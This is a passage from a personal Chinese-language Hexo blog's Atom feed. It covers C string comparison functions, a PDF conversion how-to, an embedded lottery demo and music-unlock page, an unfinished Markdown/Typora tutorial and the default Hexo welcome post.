class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;两个字符串前7个字符不同！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">两个字符串不同！</span><br><span class="line">两个字符串前<span class="number">7</span>个字符完全一致！</span><br></pre></td></tr></table></figure><p><strong>strcmp(s1, s2)</strong></p><p><strong>(str1, str2, n)</strong></p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td>s1</td><td>指向待比较的字符串 1</td></tr><tr><td>s2</td><td>指向待比较的字符串 2</td></tr><tr><td>n</td><td>指定待比较的字符数</td></tr></tbody></table><p>strcmp 函数用于比较两个字符串。</p><p>该函数从第一个字符开始，依次比较每个字符的 ASCII 码大小，直到发现两个字符不相等或抵达结束符（’\0’）为止。</p><p>返回值&lt;0，意思是 字符串 1 的字符小于字符串 2 对应位置的字符；</p><p>返回值=0，意思是 字符串 1 的字符等于字符串 2 对应位置的字符；</p><p>返回值&gt;0，意思是 字符串 1 的字符大于字符串 2 对应位置的字符；</p><p><br><br></p><p>strncmp 函数用于比较两个字符串的前 n 个字符。</p><p>该函数从第一个字符开始，依次比较每个字符的 ASCII 码大小，发现两个字符不相等或抵达结束符（’\0’）为止，或者前 n 个字符完全一样，也会停止比较。</p><p>返回值类型同strcmp</p><p>参考文章:<br><a href="https://fishc.com.cn/forum.php?mod=viewthread&tid=70627&extra=page=1&filter=typeid&typeid=584">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;C字符串函数，有必要好好学习，对一些字符串的处理，用正确的函数很重要。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://wujunyi792.github.io/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="C" scheme="https://wujunyi792.github.io/tags/C/"/>
    
    <category term="字符串函数" scheme="https://wujunyi792.github.io/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%87%BD%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>VIP音乐解密</title>
    <link href="https://wujunyi792.github.io/2020/12/23/VIP%E9%9F%B3%E4%B9%90%E8%A7%A3%E5%AF%86/"/>
    <id>https://wujunyi792.github.io/2020/12/23/VIP%E9%9F%B3%E4%B9%90%E8%A7%A3%E5%AF%86/</id>
    <published>2020-12-23T05:38:02.000Z</published>
    <updated>2020-12-23T13:11:11.228Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>首页显示摘要内容（替换成自己的）</p></blockquote><a id="more"></a><iframe src="/assets/unlockMusic/index.html" height="700" width="100%" scrolling="auto" frameborder="0" style="box-shadow: 0px 0px 20px -10px #888;"></iframe><p>参考文章:<br><a href="">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;首页显示摘要内容（替换成自己的）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="在线小工具" scheme="https://wujunyi792.github.io/categories/%E5%9C%A8%E7%BA%BF%E5%B0%8F%E5%B7%A5%E5%85%B7/"/>
    
    <category term="音乐" scheme="https://wujunyi792.github.io/categories/%E5%9C%A8%E7%BA%BF%E5%B0%8F%E5%B7%A5%E5%85%B7/%E9%9F%B3%E4%B9%90/"/>
    
    
    <category term="音乐解密" scheme="https://wujunyi792.github.io/tags/%E9%9F%B3%E4%B9%90%E8%A7%A3%E5%AF%86/"/>
    
    <category term="iframe框架" scheme="https://wujunyi792.github.io/tags/iframe%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>PDF的使用</title>
    <link href="https://wujunyi792.github.io/2020/12/06/PDF%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://wujunyi792.github.io/2020/12/06/PDF%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-12-06T04:29:45.000Z</published>
    <updated>2020-12-06T06:55:02.038Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>首页显示摘要内容（替换成自己的）</p></blockquote><a id="more"></a><h1 id="PDF介绍"><a href="#PDF介绍" class="headerlink" title="PDF介绍"></a>PDF介绍</h1><p>The <strong>Portable Document Format</strong> (<strong>PDF</strong>) is a <a href="https://en.wikipedia.org/wiki/File_format">file format</a> developed by <a href="https://en.wikipedia.org/wiki/Adobe_Systems">Adobe</a> in 1993 to present <a href="https://en.wikipedia.org/wiki/Document">documents</a>, including text formatting and images, in a manner independent of <a href="https://en.wikipedia.org/wiki/Application_software">application software</a>, <a href="https://en.wikipedia.org/wiki/Computer_hardware">hardware</a>, and <a href="https://en.wikipedia.org/wiki/Operating_system">operating systems</a>.Based on the <a href="https://en.wikipedia.org/wiki/PostScript">PostScript</a> language, each PDF file encapsulates a complete description of a fixed-layout flat document, including the text, <a href="https://en.wikipedia.org/wiki/Font">fonts</a>, <a href="https://en.wikipedia.org/wiki/Vector_graphics">vector graphics</a>, <a href="https://en.wikipedia.org/wiki/Raster_images">raster images</a> and other information needed to display it. PDF was standardized as ISO 32000 in 2008, and no longer requires any royalties for its implementation.</p><p>PDF files may contain a variety of content besides flat text and graphics including logical structuring elements, interactive elements such as annotations and form-fields, layers, <a href="https://en.wikipedia.org/wiki/Rich_media">rich media</a> (including video content), and three-dimensional objects using <a href="https://en.wikipedia.org/wiki/U3D">U3D</a> or <a href="https://en.wikipedia.org/wiki/PRC_(file_format)">PRC</a>, and various other data formats. The PDF specification also provides for encryption and <a href="https://en.wikipedia.org/wiki/Digital_signatures">digital signatures</a>, file attachments, and metadata to enable workflows requiring these features.</p><p>说人话，PDF是一种版式文件，它有以下几个优点：</p><ul><li>跨平台,任何支持pdf的设备都可以打开, <strong>排版和样式不会乱掉</strong>，乃学术神器</li><li>能够<strong>嵌入字体</strong>,不会因为找不到字体而显示的乱七八糟</li><li>文件体积小,方便网络传输</li><li>可以制作为交互式pdf</li><li>支持资源自包含，也就是字体信息可以内嵌到文档里面，跟着文档走</li><li>支持高压缩的图片，上百兆的图片可以装订压缩到10几兆</li><li>支持矢量图形，放大缩小不影响清晰度</li><li>所有可以被打印的文档都可以转换成PDF</li><li>支持安全加密，用于公文流转。</li></ul><p>所以用PDF格式文件提交作业绝对是个很不错的决定。那我们如何制作一个PDF文件？</p><h1 id="制作一个PDF文件"><a href="#制作一个PDF文件" class="headerlink" title="制作一个PDF文件"></a>制作一个PDF文件</h1><p>　　其实，几乎任何格式的文件都可以被转换为pdf，包括但不限于Word、Excel、PPT文件。如果电脑中没有安装Acrobat这类软件，我们可以按照如下方法将文件转换为PDF。这里以Word为例。</p><h5 id="1-打开你要的word文件"><a href="#1-打开你要的word文件" class="headerlink" title="1.打开你要的word文件"></a>1.打开你要的word文件<img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20201206143739.png" alt="一个文档"></h5><h5 id="2-打开文件→打印"><a href="#2-打开文件→打印" class="headerlink" title="2.打开文件→打印"></a>2.打开<code>文件</code>→<code>打印</code><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20201206144036.png" alt="进入打印页面"></h5><h5 id="3-选择打印机为Microsoft-Print-to-PDF，按照自己的输出需求进行设置。这里一般默认即可。配置完成后点击打印"><a href="#3-选择打印机为Microsoft-Print-to-PDF，按照自己的输出需求进行设置。这里一般默认即可。配置完成后点击打印" class="headerlink" title="3.选择打印机为Microsoft Print to PDF，按照自己的输出需求进行设置。这里一般默认即可。配置完成后点击打印"></a>3.选择打印机为<code>Microsoft Print to PDF</code>，按照自己的输出需求进行设置。这里一般默认即可。配置完成后点击<code>打印</code><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20201206144409.png" alt="打因为PDF"></h5><h5 id="4-此时会弹出将打印输出另存为的对话框，选择希望将pdf保存在哪，然后点保存"><a href="#4-此时会弹出将打印输出另存为的对话框，选择希望将pdf保存在哪，然后点保存" class="headerlink" title="4.此时会弹出将打印输出另存为的对话框，选择希望将pdf保存在哪，然后点保存"></a>4.此时会弹出<code>将打印输出另存为</code>的对话框，选择希望将pdf保存在哪，然后点<code>保存</code><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20201206144646.png" alt="选择想把文件保存在哪"></h5><h5 id="5-去看看，一个pdf文件就出现了。"><a href="#5-去看看，一个pdf文件就出现了。" class="headerlink" title="5.去看看，一个pdf文件就出现了。"></a>5.去看看，一个pdf文件就出现了。</h5><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20201206144743.png" alt=".pdf"></p><h5 id="6-通过浏览器阅读这类文件，但如果你想编辑它，得另想办法。"><a href="#6-通过浏览器阅读这类文件，但如果你想编辑它，得另想办法。" class="headerlink" title="6.通过浏览器阅读这类文件，但如果你想编辑它，得另想办法。"></a>6.通过浏览器阅读这类文件，但如果你想编辑它，得另想办法。</h5><h1 id="使用Acrobat编辑PDF"><a href="#使用Acrobat编辑PDF" class="headerlink" title="使用Acrobat编辑PDF"></a>使用Acrobat编辑PDF</h1><p>未完待续。将提供Acrobat安装包和使用教程</p><p>参考文章:<br><a href="">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;首页显示摘要内容（替换成自己的）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="软件分享" scheme="https://wujunyi792.github.io/categories/%E8%BD%AF%E4%BB%B6%E5%88%86%E4%BA%AB/"/>
    
    <category term="软件教程" scheme="https://wujunyi792.github.io/categories/%E8%BD%AF%E4%BB%B6%E5%88%86%E4%BA%AB/%E8%BD%AF%E4%BB%B6%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="PDF" scheme="https://wujunyi792.github.io/tags/PDF/"/>
    
    <category term="软件" scheme="https://wujunyi792.github.io/tags/%E8%BD%AF%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>抽奖小应用</title>
    <link href="https://wujunyi792.github.io/2020/11/29/%E6%8A%BD%E5%A5%96%E5%B0%8F%E5%BA%94%E7%94%A8/"/>
    <id>https://wujunyi792.github.io/2020/11/29/%E6%8A%BD%E5%A5%96%E5%B0%8F%E5%BA%94%E7%94%A8/</id>
    <published>2020-11-28T22:56:15.000Z</published>
    <updated>2020-12-23T13:08:56.829Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>连夜写出来的小 demo，有参考一些 GitHub 和 gitee 程序，稍后有空会补充好文档！！<br>*<em>Attention:**这个网页还未适配手机端，所以在手机上显示效果不太好，稍后会进行修正</em>（挖坑 ing）*</p></blockquote><a id="more"></a><h3 id="一些说明"><a href="#一些说明" class="headerlink" title="一些说明:"></a>一些说明:</h3><ul><li>正常操作步骤：<code>开始</code>→<code>停止</code>→<code>下一轮</code></li><li>在标签球上使用滚轮，可以对标签球进行缩放</li><li>新设备进入该网页时由于没有 json 文件缓存，会自动转入<code>setting.html</code>页面进行设置（目前接口还未配置好，故直接点击<code>下面设置好点我GoGoGo to 主页面！</code>即可）</li><li>参与人员可以修改，刷新网页数据会保留</li><li>参与人员栏底部<code>重置</code>按钮可以将参与人员列表恢复最初设置（61 人）</li><li><code>设置</code>页面头部<code>重置所有记录</code>可以清空在主页的所有抽签记录</li><li><strong>当<code>下一轮</code>按钮无法点击时，进入<code>设置</code>，进行<code>重置所有记录</code>后，通过点击<code>下面设置好点我GoGoGo to 主页面！</code>即可正常使用</strong></li><li>不要点动态标签，它会带你去不知道什么页面！！（bug 还在优化）<iframe src="/assets/lucking/index.html" height="560px" width="100%" scrolling="auto" frameborder="0" style="box-shadow: 0px 0px 20px -10px #888;"></iframe></li></ul><p>参考文章:<br><a href="">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;连夜写出来的小 demo，有参考一些 GitHub 和 gitee 程序，稍后有空会补充好文档！！&lt;br&gt;*&lt;em&gt;Attention:**这个网页还未适配手机端，所以在手机上显示效果不太好，稍后会进行修正&lt;/em&gt;（挖坑 ing）*&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="iframe框架" scheme="https://wujunyi792.github.io/categories/iframe%E6%A1%86%E6%9E%B6/"/>
    
    
    <category term="抽奖" scheme="https://wujunyi792.github.io/tags/%E6%8A%BD%E5%A5%96/"/>
    
    <category term="小游戏" scheme="https://wujunyi792.github.io/tags/%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    
  </entry>
  
  <entry>
    <title>Markdown语法与Typora初尝试</title>
    <link href="https://wujunyi792.github.io/2020/11/26/Markdown%E8%AF%AD%E6%B3%95%E4%B8%8ETypora%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <id>https://wujunyi792.github.io/2020/11/26/Markdown%E8%AF%AD%E6%B3%95%E4%B8%8ETypora%E5%88%9D%E5%B0%9D%E8%AF%95/</id>
    <published>2020-11-26T06:51:46.000Z</published>
    <updated>2020-11-27T13:46:32.121Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>首页显示摘要内容（替换成自己的）</p></blockquote><a id="more"></a><p>众所周知，当打开GitHub上几乎任何一个仓库，都会有一个readme.md文件，就像这张图展示的一样。在GitHub中可以轻松浏览这种格式的文件，一般里面写的是该仓库的介绍及操作说明，但是将该文件下载到电脑里，普通的办公软件却打不开。So what is it?</p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/README%E6%96%87%E6%A1%A3%E5%9B%BE%E7%A4%BA.png" alt="README文档图示"  /><h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><h3 id="Markdown-是什么？"><a href="#Markdown-是什么？" class="headerlink" title="Markdown 是什么？"></a>Markdown 是什么？</h3><p>Markdown 是一种轻量级标记语言，它允许人们使用易读易写的纯文本格式编写文档。Markdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。Markdown 编写的文档后缀为 <code>.md</code>, <code>.markdown</code>。当前许多网站都广泛使用 Markdown 来撰写帮助文档或是用于论坛上发表消息。例如GitHub、简书等。</p><p>Markdown 完全由标点符号组成, 这些标点经过仔细挑选以使他们看上去和表达的含义相同. 例如, 星号(*)标记的单词就像 <em>强调</em>. 列表就像是列表. 如果你使用过 email 的话, 就连块引用都像引用的文本段落.</p><p>Markdown 是用于创作web 文档的.Markdown 从来都不是要取代 HTML . Markdown 的目标是易于阅读, 创作和编辑文章. HTML 是一种 <em>发布</em> 格式; Markdown 是一种 <em>创作</em> 格式. 因此, Markdown 处理的都是纯文本.</p><h3 id="语法规范"><a href="#语法规范" class="headerlink" title="语法规范"></a>语法规范</h3><ol><li><h4 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h4><p>Markdown标题有两种格式。</p><p><strong>使用<code>=</code>和<code>-</code>标记一级标题和二级标题</strong></p><p>显示效果如下：</p><p><img src="https://images-wujunyi.oss-cn-shanghai.aliyuncs.com/blog/20201126191556.png" alt="用=和-标记标题"></p><p>标记语言格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">我是一级标题，我底下的&#x3D;只有一个也行</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">我是二级标题，我底下的-只有一个也行</span><br><span class="line">-----------</span><br></pre></td></tr></table></figure><p>值得注意的是，有时候我们用Typora等软件编辑的时候，输入完标题行敲击<code>Enter</code>并输入<code>====</code>却没有标题效果，我们只需将<code>Enter</code>换为<code>Shift+Enter</code>便可解决这一问题，这是由于Enter为换段而非换行所致。具体在<strong>段落章节</strong>中具体介绍。</p></li><li><p>段落</p><p>Markdown语法中，</p></li><li><p>列表</p></li><li><p>区块</p></li><li><p>代码</p></li><li><p>链接</p></li><li><p>图片</p></li><li><p>表格</p></li><li><p>其他</p></li></ol><p>参考文章:<br><a href="">参考链接</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;首页显示摘要内容（替换成自己的）&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="标记语言" scheme="https://wujunyi792.github.io/categories/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Markdown" scheme="https://wujunyi792.github.io/tags/Markdown/"/>
    
    <category term="Typora" scheme="https://wujunyi792.github.io/tags/Typora/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://wujunyi792.github.io/2020/11/25/hello-world/"/>
    <id>https://wujunyi792.github.io/2020/11/25/hello-world/</id>
    <published>2020-11-25T04:49:41.970Z</published>
    <updated>2020-11-25T09:33:37.699Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
